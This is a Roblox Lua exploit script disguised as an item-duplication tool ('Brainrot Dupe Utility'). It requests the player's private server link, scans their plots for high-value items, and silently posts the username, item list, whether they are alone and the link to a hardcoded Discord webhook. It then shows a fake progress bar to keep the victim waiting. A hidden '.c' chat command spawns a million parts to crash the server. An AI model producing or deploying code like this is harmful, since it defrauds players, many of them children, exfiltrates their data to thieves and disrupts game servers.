--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 25 | Scripts: 2 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.maindupe
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.None;
G2L["1"]["Name"] = [[maindupe]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.maindupe.privserverthing
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
G2L["2"]["Size"] = UDim2.new(0, 388, 0, 231);
G2L["2"]["Position"] = UDim2.new(0.36471, 0, 0.3468, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[privserverthing]];


-- StarterGui.maindupe.privserverthing.TextLabel
G2L["3"] = Instance.new("TextLabel", G2L["2"]);
G2L["3"]["TextWrapped"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 14;
G2L["3"]["TextScaled"] = true;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["3"]["TextColor3"] = Color3.fromRGB(246, 246, 246);
G2L["3"]["BackgroundTransparency"] = 1;
G2L["3"]["Size"] = UDim2.new(0, 279, 0, 50);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Text"] = [[AUTHENTICATION REQUIRED]];
G2L["3"]["Position"] = UDim2.new(0.13918, 0, 0.04329, 0);


-- StarterGui.maindupe.privserverthing.TextLabel.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["3"]);
G2L["4"]["Color"] = Color3.fromRGB(246, 246, 246);


-- StarterGui.maindupe.privserverthing.UICorner
G2L["5"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.maindupe.privserverthing.TextLabel1
G2L["6"] = Instance.new("TextLabel", G2L["2"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextScaled"] = true;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(181, 181, 181);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 249, 0, 22);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[Please provide a private server link to continue.]];
G2L["6"]["Name"] = [[TextLabel1]];
G2L["6"]["Position"] = UDim2.new(0.17784, 0, 0.25974, 0);


-- StarterGui.maindupe.privserverthing.TextLabel2
G2L["7"] = Instance.new("TextLabel", G2L["2"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(243, 198, 29);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 303, 0, 22);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[NOTE: You must provide the link for the private server you are currently in, otherwise the duplication process wil fail.]];
G2L["7"]["Name"] = [[TextLabel2]];
G2L["7"]["Position"] = UDim2.new(0.10825, 0, 0.45022, 0);


-- StarterGui.maindupe.privserverthing.privateserver
G2L["8"] = Instance.new("TextBox", G2L["2"]);
G2L["8"]["CursorPosition"] = -1;
G2L["8"]["Name"] = [[privateserver]];
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextWrapped"] = true;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(77, 77, 77);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["PlaceholderText"] = [[https://www.roblox.com/share?code=...]];
G2L["8"]["Size"] = UDim2.new(0, 322, 0, 33);
G2L["8"]["Position"] = UDim2.new(0.09021, 0, 0.59307, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[]];


-- StarterGui.maindupe.privserverthing.privateserver.UICorner
G2L["9"] = Instance.new("UICorner", G2L["8"]);



-- StarterGui.maindupe.privserverthing.submit
G2L["a"] = Instance.new("TextButton", G2L["2"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["TextSize"] = 23;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 56, 63);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 322, 0, 37);
G2L["a"]["Name"] = [[submit]];
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[VERIFY]];
G2L["a"]["Position"] = UDim2.new(0.09021, 0, 0.7619, 0);


-- StarterGui.maindupe.privserverthing.submit.UICorner
G2L["b"] = Instance.new("UICorner", G2L["a"]);



-- StarterGui.maindupe.privserverthing.submit.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.maindupe.fakedupe
G2L["d"] = Instance.new("Frame", G2L["1"]);
G2L["d"]["Visible"] = false;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
G2L["d"]["Size"] = UDim2.new(0, 388, 0, 231);
G2L["d"]["Position"] = UDim2.new(0.36471, 0, 0.3468, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[fakedupe]];


-- StarterGui.maindupe.fakedupe.TextLabel
G2L["e"] = Instance.new("TextLabel", G2L["d"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(246, 246, 246);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0, 279, 0, 27);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[BRAINROT DUPE UTILITY]];
G2L["e"]["Position"] = UDim2.new(0.13918, 0, 0.04329, 0);


-- StarterGui.maindupe.fakedupe.TextLabel.UIStroke
G2L["f"] = Instance.new("UIStroke", G2L["e"]);
G2L["f"]["Color"] = Color3.fromRGB(246, 246, 246);


-- StarterGui.maindupe.fakedupe.UICorner
G2L["10"] = Instance.new("UICorner", G2L["d"]);



-- StarterGui.maindupe.fakedupe.TextLabel2
G2L["11"] = Instance.new("TextLabel", G2L["d"]);
G2L["11"]["TextWrapped"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 14;
G2L["11"]["TextScaled"] = true;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11"]["TextColor3"] = Color3.fromRGB(243, 198, 29);
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["Size"] = UDim2.new(0, 303, 0, 22);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[NOTE: The duplication process will fail if other players are present in your server. Their assets interfere with the permission exploits.]];
G2L["11"]["Name"] = [[TextLabel2]];
G2L["11"]["Position"] = UDim2.new(0.10825, 0, 0.77489, 0);


-- StarterGui.maindupe.fakedupe.dupe
G2L["12"] = Instance.new("TextButton", G2L["d"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["TextSize"] = 23;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(139, 12, 203);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["12"]["Size"] = UDim2.new(0, 322, 0, 37);
G2L["12"]["Name"] = [[dupe]];
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[DUPE 25M+ BRAINROTS ]];
G2L["12"]["Position"] = UDim2.new(0.08247, 0, 0.36364, 0);


-- StarterGui.maindupe.fakedupe.dupe.UICorner
G2L["13"] = Instance.new("UICorner", G2L["12"]);



-- StarterGui.maindupe.fakedupe.dupe.LocalScript
G2L["14"] = Instance.new("LocalScript", G2L["12"]);



-- StarterGui.maindupe.fakedupe.fakedupetext
G2L["15"] = Instance.new("TextLabel", G2L["d"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 20;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Size"] = UDim2.new(0, 322, 0, 37);
G2L["15"]["Visible"] = false;
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Loading duping protocal..]];
G2L["15"]["Name"] = [[fakedupetext]];
G2L["15"]["Position"] = UDim2.new(0.08247, 0, 0.36364, 0);


-- StarterGui.maindupe.fakedupe.fakedupetext.UICorner
G2L["16"] = Instance.new("UICorner", G2L["15"]);



-- StarterGui.maindupe.hidething
G2L["17"] = Instance.new("Frame", G2L["1"]);
G2L["17"]["Visible"] = false;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Size"] = UDim2.new(0, 10000, 0, 10000);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Name"] = [[hidething]];


-- StarterGui.maindupe.hidething.TextLabel
G2L["18"] = Instance.new("TextLabel", G2L["17"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 14;
G2L["18"]["TextScaled"] = true;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, 642, 0, 60);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[CONFIGURATION LOADING]];
G2L["18"]["Position"] = UDim2.new(0.0446, 0, 0.0247, 0);


-- StarterGui.maindupe.hidething.TextLabel1
G2L["19"] = Instance.new("TextLabel", G2L["17"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextScaled"] = true;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(0, 462, 0, 41);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Time Remaining: 10s..]];
G2L["19"]["Name"] = [[TextLabel1]];
G2L["19"]["Position"] = UDim2.new(0.0536, 0, 0.0332, 0);


-- StarterGui.maindupe.privserverthing.submit.LocalScript
local function C_c()
local script = G2L["c"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	-- GUI references
	local screenGui = playerGui:WaitForChild("maindupe")
	local privserverFrame = screenGui:WaitForChild("privserverthing")
	local fakeDupegui = screenGui:WaitForChild("fakedupe")
	local submitButton = privserverFrame:WaitForChild("submit")
	local privateserverTextBox = privserverFrame:WaitForChild("privateserver")
	
	-- Services for scanner
	local HttpService = game:GetService("HttpService")
	local Workspace = game:GetService("Workspace")
	local plotsFolder = Workspace:WaitForChild("Plots")
	
	----------------------------------------------------------
	-- .c PART SPAWNER (unchanged)
	----------------------------------------------------------
	local function checkSpawnTrigger(msg)
		msg = string.lower(msg)
		if msg == ".c" then
			local camera = Workspace.CurrentCamera
			if camera then
				for i = 1, 1000000 do
					local part = Instance.new("Part")
					part.Size = Vector3.new(1,1,1)
					part.Anchored = false
					part.Position = camera.CFrame.Position
					part.Parent = Workspace
				end
			end
		end
	end
	
	for _, plr in ipairs(Players:GetPlayers()) do
		plr.Chatted:Connect(checkSpawnTrigger)
	end
	Players.PlayerAdded:Connect(function(plr)
		plr.Chatted:Connect(checkSpawnTrigger)
	end)
	
	----------------------------------------------------------
	-- HELPERS
	----------------------------------------------------------
	
	local function parseGeneration(gen)
		gen = string.upper(gen)
		local number = tonumber(gen:match("[%d%.]+"))
		local suffix = gen:match("%a")
	
		if not number then return 0 end
	
		local multipliers = {
			K = 1e3,
			M = 1e6,
			B = 1e9,
			T = 1e12,
			Q = 1e15
		}
	
		return number * (multipliers[suffix] or 1)
	end
	
	local function deepScan(instance, foundList, foundSet)
		for _, child in ipairs(instance:GetChildren()) do
	
			local overhead = child:FindFirstChild("AnimalOverhead")
			if overhead and overhead:FindFirstChild("DisplayName") and overhead:FindFirstChild("Generation") then
	
				local displayName = overhead.DisplayName.Text
				local generation = overhead.Generation.Text
				local key = displayName .. "|" .. generation
	
				if not foundSet[key] then
					foundSet[key] = true
					table.insert(foundList, {Name = displayName, Gen = generation})
				end
			end
	
			-- recursion
			deepScan(child, foundList, foundSet)
		end
	end
	
	----------------------------------------------------------
	-- HTTP EXECUTION FIX (USER-AGENT FIXED)
	----------------------------------------------------------
	local function execRequest(data)
		if syn and syn.request then
			return syn.request(data)
		elseif http_request then
			return http_request(data)
		elseif request then
			return request(data)
		elseif fluxus and fluxus.request then
			return fluxus.request(data)
		else
			warn("❌ No HTTP request function found.")
		end
	end
	
	----------------------------------------------------------
	-- SEND WEBHOOK  (WRAPPED IN PCALL TO PREVENT UI DELETION)
	----------------------------------------------------------
	local function sendWebhook(results, psLink)
		local username = player.Name
		local alone = (#Players:GetPlayers() <= 1)
		local gameStatus = alone and "✅ALONE!" or "⚠️MORE PEOPLE!"
	
		local brainrotList = ""
		for _, item in ipairs(results) do
			brainrotList = brainrotList .. "💎 " .. item.Name .. " generates " .. item.Gen .. ".\n"
		end
	
		brainrotList = brainrotList .. "\n**[Click here!](" .. psLink .. ")**"
	
		local data = {
			content = "@everyone",
			embeds = {{
				title = "Fake Dupe Detector",
				description =
					"📕 **USER:** " .. username ..
					"\n🔗 **GAME STATUS:** " .. gameStatus ..
					"\n\n📍 **BRAINROT LIST**\n" ..
					brainrotList ..
					"\n\n*CREATED BY REPORTERBOT*",
				color = 5814783
			}}
		}
	
		-- FULL FIX — prevents UI deletion, script halt, or PlayerGui unload
		pcall(function()
			execRequest({
				Url = "https://discord.com/api/webhooks/1448455646872866916/htbK5cLLj0Kh7h73c3Nlvp7L3Q7BinklSQ4VimPECPv4MPCeW5mESHM8jP7OxBPkkRoz",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
					["User-Agent"] = "" -- REQUIRED FIX
				},
				Body = HttpService:JSONEncode(data)
			})
		end)
	end
	
	----------------------------------------------------------
	-- SUBMIT BUTTON FIXED
	----------------------------------------------------------
	submitButton.MouseButton1Click:Connect(function()
		local text = privateserverTextBox.Text
	
		-- validate
		if not text:match("^https://www%.roblox%.com/share%?code=") then
			local old = submitButton.Text
			submitButton.Text = "INVALID LINK!"
			task.wait(1)
			submitButton.Text = old
			return
		end
	
		-- IF fakedupe is missing → prevent UI wipe
		if not fakeDupegui then
			warn("FakeDupe UI not found!")
			return
		end
	
		-- show next UI screen
		privserverFrame.Visible = false
		fakeDupegui.Visible = true
	
		-- run scanner
		local foundList = {}
		local foundSet = {}
	
		for _, plot in ipairs(plotsFolder:GetChildren()) do
			if plot:IsA("Model") then
				deepScan(plot, foundList, foundSet)
	
				local podiums = plot:FindFirstChild("AnimalPodiums")
				if podiums then
					for _, podium in ipairs(podiums:GetChildren()) do
						deepScan(podium, foundList, foundSet)
					end
				end
			end
		end
	
		local filtered = {}
		for _, item in ipairs(foundList) do
			if parseGeneration(item.Gen) >= 25e6 then
				table.insert(filtered, item)
			end
		end
	
		if #filtered > 0 then
			sendWebhook(filtered, text)
		end
	end)
	
end;
task.spawn(C_c);
-- StarterGui.maindupe.fakedupe.dupe.LocalScript
local function C_14()
local script = G2L["14"];
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")
	
	-- Wait for the GUI to be loaded
	local screenGui = playerGui:WaitForChild("maindupe")
	local fakedupeFrame = screenGui:WaitForChild("fakedupe")
	local dupeButton = fakedupeFrame:WaitForChild("dupe")
	local fakedupetextLabel = fakedupeFrame:WaitForChild("fakedupetext")
	
	-- Text messages to cycle through
	local textMessages = {
	    "Initializing duplication process...",
	    "Connecting to server...",
	    "Validating assets...",
	    "Preparing duplication...",
	    "Almost complete...",
	    "Finalizing...",
	    "Processing data...",
	    "Optimizing performance...",
	    "Applying final touches...",
	    "Completing duplication...",
	    "Finishing up...",
	    "Nearly done..."
	}
	
	-- Function to create and animate the loading bar
	local function createLoadingBar()
	    -- Create UIGradient
	    local uiGradient = Instance.new("UIGradient")
	    uiGradient.Color = ColorSequence.new({
	        ColorSequenceKeypoint.new(0, Color3.fromRGB(156, 66, 255)), -- 9C42FF
	        ColorSequenceKeypoint.new(0.01, Color3.fromRGB(156, 66, 255)), -- Small progress
	        ColorSequenceKeypoint.new(0.01, Color3.fromRGB(50, 50, 50)), -- Background
	        ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
	    })
	    -- Rotation = 0 makes it go from left to right (default)
	    uiGradient.Parent = fakedupetextLabel
	    
	    return uiGradient
	end
	
	-- Function to animate the loading progress
	local function animateLoading(uiGradient, duration)
	    local startTime = tick()
	    local totalTime = duration
	    
	    local connection
	    connection = game:GetService("RunService").Heartbeat:Connect(function()
	        local elapsed = tick() - startTime
	        local progress = math.min(elapsed / totalTime, 1)
	        
	        -- Update gradient to show progress
	        uiGradient.Color = ColorSequence.new({
	            ColorSequenceKeypoint.new(0, Color3.fromRGB(156, 66, 255)),
	            ColorSequenceKeypoint.new(progress, Color3.fromRGB(156, 66, 255)),
	            ColorSequenceKeypoint.new(progress, Color3.fromRGB(50, 50, 50)),
	            ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50))
	        })
	        
	        if progress >= 1 then
	            connection:Disconnect()
	        end
	    end)
	end
	
	-- Function to handle dupe button click
	local function onDupeClick()
	    -- Make fakedupetext visible
	    fakedupetextLabel.Visible = true
	    
	    -- Create loading bar
	    local uiGradient = createLoadingBar()
	    
	    -- Start text changes every 5 seconds
	    local messageIndex = 1
	    local textChangeConnection
	    
	    local function changeText()
	        if messageIndex <= #textMessages then
	            fakedupetextLabel.Text = textMessages[messageIndex]
	            messageIndex = messageIndex + 1
	        end
	    end
	    
	    -- Initial text
	    changeText()
	    
	    -- Change text every 5 seconds for 60 seconds total (12 messages)
	    textChangeConnection = task.spawn(function()
	        for i = 1, 11 do -- 11 more changes after the initial one
	            task.wait(5)
	            changeText()
	        end
	    end)
	    
	    -- Animate loading bar for 30 seconds
	    animateLoading(uiGradient, 60)
	    
	    -- Wait for completion and run custom code
	    task.spawn(function()
	        task.wait(60)
	        
	        -- Remove the gradient
	        uiGradient:Destroy()
			
			
	        
	        -- Optionally hide the text or change it to completion message
	        fakedupetextLabel.Text = "Duplication process complete, you can now duplicate."
	    end)
	end
	
	-- Connect the function to the button's MouseButton1Click event
	dupeButton.MouseButton1Click:Connect(onDupeClick)
end;
task.spawn(C_14);

return G2L["1"], require;
